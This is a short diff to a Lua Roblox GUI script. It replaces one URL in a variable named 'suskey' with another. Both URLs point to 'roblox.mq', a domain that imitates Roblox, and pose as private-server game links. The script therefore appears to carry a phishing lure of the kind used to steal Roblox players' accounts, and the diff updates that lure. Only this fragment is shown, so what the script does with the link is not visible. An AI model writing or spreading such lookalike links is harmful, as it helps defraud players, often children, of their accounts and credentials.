@@ -1,7 +1,7 @@
 -- yes, this script was made with GUI to Lua, now shut up
 -- around line 112 is where you put your script
 
-local suskey = "https://roblox.mq/games/920587237/Adopt-Me?privateServerLinkCode=37874075813602120176947608886205"
+local suskey = "https://www.roblox.mq/games/8361082694/CATALOG-Bloxlink-HQ-WIP?privateServerLinkCode=66094273904388914246184075113375"
 
 local GUI = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
